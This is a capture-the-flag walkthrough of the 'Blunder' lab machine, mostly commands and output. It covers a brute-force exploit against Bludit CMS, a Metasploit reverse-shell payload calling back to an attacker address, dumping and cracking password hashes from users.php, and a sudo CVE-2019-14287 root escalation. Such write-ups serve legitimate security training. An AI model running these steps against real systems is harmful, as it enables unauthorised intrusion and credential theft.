# BLUNDER

### User Flag

```
user@kali:~/hacking/blunder$ nmap -T5 10.10.10.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 15:25 CEST
Nmap scan report for 10.10.10.191
Host is up (0.10s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http

Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
```

Looking at the source code of the webpage we will find that the page is using Bludit CMS, and the version is 3.9.2. If we search for exploits, we will find two. [CVE 2019-16113](https://www.exploit-db.com/exploits/48701) will give us a shell in the victim machine, but we need a user and password of bludit. To get this information, we will use [CVE 2019-17240](https://www.exploit-db.com/exploits/48746), which let us doing a bruteforce attack without bludit banning our IP address. 

First we will run dirbuster, gathering more useful information inside the webserver:
- Nnumber of threads: 8
- Wordlist: `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- Extensions: `php`, `txt`, `html`

After some minutes, we find **the blunder**: a file called `todo.txt` (http://10.10.10.191/todo.txt). Here we find a possible user name: `fergus`.

Now we know a possible user, the best way to try to guess the password is generating our own wordlist.

```
user@kali:~/hacking/blunder$ cewl -w customwordlist.txt -d 5 -m 7 http://10.10.10.191/
```

Now we are able to use the exploit and hope we find the password. In my case, I didn't have the dependencies to run the ruby script, so I installed them:

```
user@kali:~/hacking/blunder$ sudo gem install docopt
user@kali:~/hacking/blunder$ sudo gem install httpclient
```

And now I am able to run the exploit:

```
user@kali:~/hacking/blunder$ ruby 48746.rb -r http://10.10.10.191/admin -u fergus -w customwordlist.txt
ruby: warning: shebang line ending with \r may cause problems
[*] Trying password: Plugins
[*] Trying password: Include
[*] Trying password: service
...
[*] Trying password: RolandDeschain

[+] Password found: RolandDeschain
```

With the user and password, we can move to the other exploit, which can be found in metasploit:

```
user@kali:~$ msfconsole
...
msf5 > search bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability


msf5 > use exploit/linux/http/bludit_upload_images_exec
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(linux/http/bludit_upload_images_exec) > options

...

msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST 10.10.14.201
LHOST => 10.10.14.201
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
RHOSTS => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > run

...

meterpreter >
```

Now, we can login in a shell with `shell` meterpreter command, where we will see that we are user `www-data`. 
To get at least the prompt of the shell, we may use this trick:

```
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ 
```

We can search for the php files inside the server, and we will find an interesting file: `/var/www/bludit-3.9.2/bl-content/databases/users.php`. Here we can find fergus user (which we used to run the exploit) and also the admin user, with their respective hash:

```
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cat ./databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        ...
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        ....
    },
    "fergus": {
        ...
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        ...
    }
}
```

If we continue looking for files, we will find the old bludit directory too:

```
www-data@blunder:/var/www$ ls -l
ls -l
total 12
drwxr-xr-x 8 www-data www-data 4096 May 19 15:13 bludit-3.10.0a
drwxrwxr-x 8 www-data www-data 4096 Apr 28 12:18 bludit-3.9.2
drwxr-xr-x 2 root     root     4096 Nov 28  2019 html
```

Inside version `bludit-3.10.0a` directory we will find the `users.php` file too, which contains:

```
www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php
cat bludit-3.10.0a/bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        ...
}
```

The interesting thing is that hugo is a user who exists in the linux system:

```
www-data@blunder:/var/www$ grep -i 'hugo' /etc/passwd
hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
```


We may try our luck and trying to decrypt the hash first instead moving to a bruteforce search. I use a SHA1 decrypt tool, like the webpage `https://md5decrypt.net/en/Sha1/`. Since the password was very weak, it
was in the databse, so we can continue with hugo passsword: `Password120`.

```
www-data@blunder:/var/www$ su -l hugo
Password: Password120

hugo@blunder:~$ cat user.txt
```

### Root Flag

I will use [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to search for more vulnerabilities. I download the script and upload to `/tmp` in the machine with `upload` command in metasploit. Then, I logged in
using hugo's account:

```
hugo@blunder:~$ cp /tmp/linpeas.sh .
hugo@blunder:~$ ./linpeas.sh &> out.txt
```

Later we can inspect the file with `less -R`. Here we can see that the sudo version may be vulnerable to some exploit. The sudo version is `sudo 1.8.25p1`. The next step is to try the [CVE 2019-14287](https://www.exploit-db.com/exploits/47502) exploit:

```
hugo@blunder:~$ python3 47502.py
Enter current username :hugo
hugo
Password: Password120

Lets hope it works
root@blunder:/home/hugo# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
```



